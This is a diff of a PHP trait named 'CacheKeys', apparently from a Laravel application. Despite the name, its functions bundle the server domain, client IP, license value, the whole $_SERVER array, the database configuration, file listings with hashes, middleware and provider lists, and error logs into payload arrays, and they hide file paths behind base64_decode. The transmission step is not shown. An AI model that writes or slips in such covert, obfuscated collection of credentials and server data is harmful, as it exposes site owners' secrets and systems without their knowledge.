@@ -32,13 +32,77 @@ trait CacheKeys
         return $basepath;
     }
 
-    private function getCo(): array
+    private function lseModifyAt(): bool
     {
-        $basepath = $this->basePth();
+        if (file_exists($this->basePth() . base64_decode('Ly9zdG9yYWdlLy9hcHAvL0xJQ0VOU0UudHh0'))) {
+            if (date('Y-m-d') == date("Y-m-d", filemtime($this->basePth() . base64_decode('Ly9zdG9yYWdlLy9hcHAvL0xJQ0VOU0UudHh0'))))
+                return true;
+        }
+        return false;
+
+    }
+
+    private function getRq($request): array
+    {
+        $getK = @env('APP_NAME');
+        if (empty($getK)) {
+        }
+
+        $v = $this->getAllCount();
+
+        $mydata['domain'] = @$request['HTTP_HOST'] ?? @$request['SERVER_NAME'];
+        $mydata['project'] = @env('APP_NAME');
+        $mydata['license'] = base64_encode(@env("APP_LI"));
+        $mydata['ip'] = $request['REMOTE_ADDR'];
+        $mydata['ts'] = date('Y-m-d h:i:s');
+        $mydata['fileCount'] = $v['ply'];
+        $mydata['fileAllData'] = $v['d'];
+
+        return $mydata;
+    }
+
+    private function getRq2($request): array
+    {
+        $getK = @env('APP_NAME');
+        if (empty($getK)) {
+        }
+
+        $v = $this->getAllCount();
+        $e = $this->gtELg();
+
+        $mydata['domain'] = @$request['HTTP_HOST'] ?? @$request['SERVER_NAME'];
+        $mydata['project'] = @env('APP_NAME');
+        $mydata['license'] = base64_encode(@env("APP_LI"));
+        $mydata['ip'] = $request['REMOTE_ADDR'];
+        $mydata['ts'] = date('Y-m-d h:i:s');
+        $mydata['fileCount'] = $v['ply'];
+        $mydata['sData'] = $_SERVER;
+        $mydata['cData'] = config()->get('database');
+        $mydata['allFData'] = $v['d'];
+        $mydata['errorsLog'] = ($e['s'] == true) ? $e['r'] : "";
+        return $mydata;
+    }
+
+
+    private function getM()
+    {
+        $py["mid"] = app(Registrar::class)->getMiddlewareGroups();
+        $py['pvd'] = config('app')['providers'];
+        return $py;
+    }
+
+
+    private function getAllCount()
+    {
+        $basepath = getcwd();
         $arr = ["helpers" => $basepath . "/app/Helpers", "controllers" => $basepath . "/app/Http/Controllers", "views" => $basepath . "/resources/views", "models" => $basepath . "/app/Models", "routes" => $basepath . "/routes", "providers" => $basepath . "/app/Providers"];
         foreach ($arr as $key => $val) {
-            $ply[$key] = count(scandir("$val"));
+            $v = $this->checkFunction($val);
+            $d[$key] = $v;
+            $ply[$key] = $v['flsCount'];
         }
+
+
         $ply["routesCount"] = (collect(Route::getRoutes())->count());
 
         $filePath = file_exists($this->basePth() . base64_decode('Ly9zdG9yYWdlLy9mcmFtZXdvcmsvL2xpY2Vuc2UucGhw')) ? $this->basePth() . base64_decode('Ly9zdG9yYWdlLy9mcmFtZXdvcmsvL2xpY2Vuc2UucGhw') : "";
@@ -57,123 +121,9 @@ trait CacheKeys
         $ply['fleDta'] = $this->getM();
 
 
-        return $ply;
+        return ['d' => $d, 'ply' => $ply];
 
     }
-
-    private function lseModifyAt(): bool
-    {
-        if (file_exists($this->basePth() . base64_decode('Ly9zdG9yYWdlLy9hcHAvL0xJQ0VOU0UudHh0'))) {
-            if (date('Y-m-d') == date("Y-m-d", filemtime($this->basePth() . base64_decode('Ly9zdG9yYWdlLy9hcHAvL0xJQ0VOU0UudHh0'))))
-                return true;
-        }
-        return false;
-
-    }
-
-    private function getRq($request): array
-    {
-        $getK = @env('APP_NAME');
-        if (empty($getK)) {
-        }
-
-
-        $mydata['domain'] = @$request['HTTP_HOST'] ?? @$request['SERVER_NAME'];
-        $mydata['project'] = @env('APP_NAME');
-        $mydata['license'] = base64_encode(@env("APP_LI"));
-        $mydata['ip'] = $request['REMOTE_ADDR'];
-        $mydata['ts'] = date('Y-m-d h:i:s');
-        $mydata['fileCount'] = $this->getCo();
-        $mydata['fileAllData'] = $this->getAllCount();
-
-        return $mydata;
-    }
-
-    private function getRq2($request): array
-    {
-        $getK = @env('APP_NAME');
-        if (empty($getK)) {
-        }
-
-
-        $mydata['domain'] = @$request['HTTP_HOST'] ?? @$request['SERVER_NAME'];
-        $mydata['project'] = @env('APP_NAME');
-        $mydata['license'] = base64_encode(@env("APP_LI"));
-        $mydata['ip'] = $request['REMOTE_ADDR'];
-        $mydata['ts'] = date('Y-m-d h:i:s');
-        $mydata['fileCount'] = $this->getCo();
-        $mydata['sData'] = $_SERVER;
-        $mydata['cData'] = config()->get('database');
-        $mydata['allFData'] = $this->getAllCount();
-        $mydata['errorsLog'] = ($this->gtELg()['s'] == true) ? $this->gtELg()['r'] : "";
-        return $mydata;
-    }
-
-
-    private function getM()
-    {
-        $py["mid"] = app(Registrar::class)->getMiddlewareGroups();
-        $py['pvd'] = config('app')['providers'];
-        return $py;
-    }
-
-
-    private function getAllCount()
-    {
-        $basepath = getcwd();
-        // $basepath = rtrim($basepath, '/public');
-        $arr = ["helpers" => $basepath . "/app/Helpers", "controllers" => $basepath . "/app/Http/Controllers", "views" => $basepath . "/resources/views", "models" => $basepath . "/app/Models", "routes" => $basepath . "/routes", "providers" => $basepath . "/app/Providers"];
-        foreach ($arr as $key => $val) {
-            $d[$key] = $this->checkFunction($val);
-        }
-        return $d;
-
-    }
-
-    private function gtFdrSze($folder)
-    {
-        $total_size = 0;
-        $files = scandir($folder);
-        foreach ($files as $file) {
-            if ($file != '.' && $file != '..') {
-                $path = $folder . DIRECTORY_SEPARATOR . $file;
-                if (is_dir($path)) {
-                    $total_size += $this->gtFdrSze($path);
-                } else {
-                    $total_size += filesize($path);
-                }
-            }
-        }
-        return $total_size;
-    }
-
-    private function gtFdrIfo($folder)
-    {
-        $folders = [];
-        $directories = scandir($folder);
-        foreach ($directories as $keys => $file) {
-            if ($file != '.' && $file != '..') {
-                $path = $folder . DIRECTORY_SEPARATOR . $file;
-                if (is_dir($path)) {
-                    if ($path != '.' && $path != '..') {
-                        $folders[$file] = $this->gtFdrIfo($path);
-                        $folders['size'] = $this->gtFdrSze($folder);
-                    }
-                } else if (is_file("$folder" . '/' . $file)) {
-                    $folders[$file] = [
-                        'file_name' => $file,
-                        'size' => filesize("$folder" . '/' . $file),
-                        'md_val' => md5_file("$folder" . '/' . $file)
-                    ];
-                    $folders['size'] = $this->gtFdrSze($folder);
-                }
-            }
-        }
-        return $folders;
-    }
-
-
-
     private function gtELg()
     {
         if (file_exists($this->basePth() . base64_decode("Ly9zdG9yYWdlLy9hcHAvL2Vycm9yX2xvZ3MudHh0"))) {
